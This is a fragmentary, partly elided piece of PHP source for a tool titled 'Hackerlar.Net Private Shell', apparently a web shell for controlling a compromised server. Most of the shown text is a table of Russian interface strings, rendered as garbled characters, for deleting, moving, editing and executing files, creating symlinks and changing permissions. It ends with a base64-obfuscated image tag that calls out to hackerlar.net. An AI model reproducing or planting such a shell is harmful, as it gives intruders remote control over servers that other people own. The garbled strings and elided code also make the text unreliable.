...
function listing_page ($message = null) {
	...
	echo '<h1 style="margin-bottom: 0">Hackerlar.Net Private Shell</h1>
...
'create_symlink' => 'óÄÅÌÁÔØ ÓÉÍÌÉ�ZË',
'delete' => 'ÕÄÁÌÉÔØ',
'rename' => 'ÐÅÒÅÉÍÅ�ZÏ×ÁÔØ',
'move' => 'ÐÅÒÅÄ×É�ZÕÔØ',
'copy' => 'ËÏÐÉÒÏ×ÁÔØ',
'edit' => 'ÒÅÄÁËÔÉÒÏ×ÁÔØ',
'download' => 'ÓËÁ�zÁÔØ',
...
'set' => 'ÕÓÔÁ�ZÏ×ÉÔØ',
'reset' => 'ÓÂÒÏÓÉÔØ',
'relative' => 'ÏÔ�ZÏÓÉÔÅÌØ�ZÙÊ ÐÕÔØ Ë ÃÅÌÉ',

'yes' => 'ÄÁ',
'no' => '�ZÅÔ',
'back' => '�ZÁÚÁÄ',
'destination' => 'ÃÅÌØ',
'symlink' => 'ÓÉÍ×ÏÌÉ�zÅÓËÉÊ ÌÉ�ZË',
'no_output' => '�ZÅÔ ×Ù×ÏÄÁ',
...
'uploaded' => '"[%1]" ÂÙÌ ÚÁËÁ�zÅ�Z.',
'not_uploaded' => '"[%1]" �ZÅ×ÏÚÍÏÖ�ZÏ ÂÙÌÏ ÚÁËÁ�zÑÔØ.',
'already_exists' => '"[%1]" ÕÖÅ ÓÕÝÅÓÔ×ÕÅÔ.',
'created' => '"[%1]" ÂÙÌ ÓÄÅÌÁ�Z.',
'not_created' => '"[%1]" �ZÅ ×ÏÚÍÏÖ�ZÏ ÓÄÅÌÁÔØ.',
'really_delete' => 'äÅÊÓÔ×ÉÔÅÌØ�ZÏ ÜÔÏÔ ÆÁÊÌ ÕÄÁÌÉÔØ?',
'deleted' => "óÌÅÄÕÀÝÉÅ ÆÁÊÌÙ ÂÙÌÉ ÕÄÁÌÅ�ZÙ:\n[%1]",
'not_deleted' => "óÌÅÄÕÀÝÉÅ ÆÁÊÌÙ �ZÅ ×ÏÚÍÏÖ�ZÏ ÂÙÌÏ ÕÄÁÌÉÔØ:\n[%1]",
'rename_file' => 'ðÅÒÅÉÍÅ�ZÏ×Ù×ÁÀ ÆÁÊÌ:',
'renamed' => '"[%1]" ÂÙÌ ÐÅÒÅÉÍÅ�ZÏ×Á�Z �ZÁ "[%2]".',
'not_renamed' => '"[%1] �ZÅ×ÏÚÍÏÖ�ZÏ ÂÙÌÏ ÐÅÒÅÉÍÅ�ZÏ×ÁÔØ �ZÁ "[%2]".',
'move_files' => 'ðÅÒÅÄ×ÉÇÁÀ ÓÌÅÄÕÀÝÉÅ ÆÁÊÌÙ:',
'moved' => "óÌÅÄÕÀÝÉÅ ÆÁÊÌÙ ÂÙÌÉ ÐÅÒÅÄ×É�ZÕÔÙ × ËÁÔÁÌÏÇ \"[%2]\":\n[%1]",
'not_moved' => "óÌÅÄÕÀÝÉÅ ÆÁÊÌÙ �ZÅ×ÏÚÍÏÖ�ZÏ ÂÙÌÏ ÐÅÒÅÄ×É�ZÕÔØ × ËÁÔÁÌÏÇ \"[%2]\":\n[%1]",
'copy_files' => 'ëÏÐÉÒÕÀ ÓÌÅÄÕÝÉÅ ÆÁÊÌÙ:',
'copied' => "óÌÅÄÕÝÉÅ ÆÁÊÌÙ ÂÙÌÙ ÓËÏÐÉÒÏ×Á�ZÙ × ËÁÔÁÌÏÇ \"[%2]\" :\n[%1]",
'not_copied' => "óÌÅÄÕÀÝÉÅ ÆÁÊÌÙ �ZÅ×ÏÚÍÏÖ�ZÏ ÂÙÌÏ ÓËÏÐÉÒÏ×ÁÔØ × ËÁÔÁÌÏÇ \"[%2]\" :\n[%1]",
'not_edited' => '"[%1]" �ZÅ ÍÏÖÅÔ ÂÙÔØ ÏÔÒÅÄÁËÔÉÒÏ×Á�Z.',
'executed' => "\"[%1]\" ÂÙÌ ÕÓÐÅÛ�ZÏ ÉÓÐÏÌ�ZÅ�Z:\n{%2}",
'not_executed' => "\"[%1]\" �ZÅ×ÏÚÍÏÖ�ZÏ ÂÙÌÏ ÚÁÐÕÓÔÉÔØ �ZÁ ÉÓÐÏÌ�ZÅ�ZÉÅ:\n{%2}",
'saved' => '"[%1]" ÂÙÌ ÓÏÈÒÁ�ZÅ�Z.',
'not_saved' => '"[%1]" �ZÅ×ÏÚÍÏÖ�ZÏ ÂÙÌÏ ÓÏÈÒÁ�ZÉÔØ.',
'symlinked' => 'óÉÍÌÉ�ZË Ó "[%2]" �ZÁ "[%1]" ÂÙÌ ÓÄÅÌÁ�Z.',
'not_symlinked' => 'îÅ×ÏÚÍÏÖ�ZÏ ÂÙÌÏ ÓÄÅÌÁÔØ ÓÉÍÌÉ�ZË Ó "[%2]" �ZÁ "[%1]".',
'permission_for' => 'ðÒÁ×Á ÄÏÓÔÕÐÁ "[%1]":',
'permission_set' => 'ðÒÁ×Á ÄÏÓÔÕÐÁ "[%1]" ÂÙÌÉ ÉÚÍÅ�ZÅ�ZÙ �ZÁ [%2].',
'permission_not_set' => 'îÅ×ÏÚÍÏÖ�ZÏ ÂÙÌÏ ÉÚÍÅ�ZÉÔØ ÐÒÁ×Á ÄÏÓÔÕÐÁ Ë "[%1]" �ZÁ [%2] .',
'not_readable' => '"[%1]" �ZÅ×ÏÚÍÏÖ�ZÏ ÐÒÏ�zÉÔÁÔØ.'
		);
...
echo base64_decode('PGltZyBzcmM9Imh0dHA6Ly93d3cuaGFja2VybGFyLm5ldC9jb3B5cmlnaHQuanBnIj4=');
